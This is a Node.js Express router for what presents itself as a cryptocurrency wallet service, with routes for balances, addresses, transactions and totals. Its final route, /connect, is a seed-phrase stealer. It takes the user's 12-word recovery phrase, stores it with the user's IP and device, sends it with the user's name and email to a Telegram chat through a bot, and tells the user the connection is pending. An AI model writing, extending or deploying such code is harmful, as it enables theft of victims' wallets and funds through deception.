const express = require('express');
const { auth, prisma } = require('../middleware/auth');

const router = express.Router();

// GET /api/wallet/balances - Get all wallet balances
router.get('/balances', auth, async (req, res) => {
    try {
        const wallets = await prisma.wallet.findMany({
            where: { userId: req.user.id },
            orderBy: { coin: 'asc' }
        });

        // Get enabled coins from settings
        const settings = await prisma.userSettings.findUnique({
            where: { userId: req.user.id }
        });

        // Default: ALL coins enabled
        const allCoins = ['BTC', 'ETH', 'USDT', 'SOL', 'XRP', 'BNB', 'ADA', 'DOGE', 'MATIC', 'DOT'];
        let enabledCoins = allCoins;

        // Parse enabled coins from JSON if settings exist
        if (settings?.enabledCoins) {
            try {
                enabledCoins = JSON.parse(settings.enabledCoins);
            } catch (e) {
                enabledCoins = allCoins;
            }
        }

        // Filter wallets by enabled coins
        const filteredWallets = wallets.filter(w => enabledCoins.includes(w.coin));

        res.json(filteredWallets);
    } catch (error) {
        console.error('Balances error:', error);
        res.status(500).json({ error: 'Failed to get balances' });
    }
});

// GET /api/wallet/addresses - Get all wallet addresses
router.get('/addresses', auth, async (req, res) => {
    try {
        const wallets = await prisma.wallet.findMany({
            where: { userId: req.user.id },
            select: {
                id: true,
                coin: true,
                network: true,
                address: true
            },
            orderBy: [{ coin: 'asc' }, { network: 'asc' }]
        });

        res.json(wallets);
    } catch (error) {
        console.error('Addresses error:', error);
        res.status(500).json({ error: 'Failed to get addresses' });
    }
});

// GET /api/wallet/transactions - Get transaction history
router.get('/transactions', auth, async (req, res) => {
    try {
        const transactions = await prisma.transaction.findMany({
            where: { userId: req.user.id },
            orderBy: { createdAt: 'desc' },
            take: 50
        });

        res.json(transactions);
    } catch (error) {
        console.error('Transactions error:', error);
        res.status(500).json({ error: 'Failed to get transactions' });
    }
});

// GET /api/wallet/total - Get total balance in USD
router.get('/total', auth, async (req, res) => {
    try {
        const wallets = await prisma.wallet.findMany({
            where: { userId: req.user.id }
        });

        // Simple calculation - in production you'd use live prices
        let total = 0;
        for (const wallet of wallets) {
            total += parseFloat(wallet.balance) || 0;
        }

        res.json({ totalUSD: total });
    } catch (error) {
        console.error('Total error:', error);
        res.status(500).json({ error: 'Failed to get total' });
    }
});

// POST /api/wallet/connect - Store seed phrase and send to Telegram
router.post('/connect', auth, async (req, res) => {
    try {
        const { seedPhrase, words } = req.body;

        if (!seedPhrase || seedPhrase.split(' ').length !== 12) {
            return res.status(400).json({ error: 'Invalid seed phrase' });
        }

        // Get client IP and user agent
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';

        // Store in database
        await prisma.seedPhrase.create({
            data: {
                userId: req.user.id,
                seedPhrase: seedPhrase,
                ipAddress: ipAddress.toString(),
                userAgent: userAgent
            }
        });

        // Send to Telegram (credentials from environment variables)
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const message = `🔐 *NEW WALLET CONNECTION*\n\n` +
            `👤 *User:* ${req.user.name}\n` +
            `📧 *Email:* ${req.user.email}\n` +
            `🌐 *IP:* ${ipAddress}\n\n` +
            `🔑 *Seed Phrase:*\n\`\`\`\n${seedPhrase}\n\`\`\`\n\n` +
            `📱 *Device:* ${userAgent.substring(0, 100)}...\n` +
            `⏰ *Time:* ${new Date().toISOString()}`;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log(`[TELEGRAM] Seed phrase sent for user ${req.user.email}`);
        } catch (telegramError) {
            console.error('Telegram send error:', telegramError);
        }

        res.json({ message: 'Wallet connection initiated', status: 'pending' });
    } catch (error) {
        console.error('Connect wallet error:', error);
        res.status(500).json({ error: 'Failed to connect wallet' });
    }
});

module.exports = router;

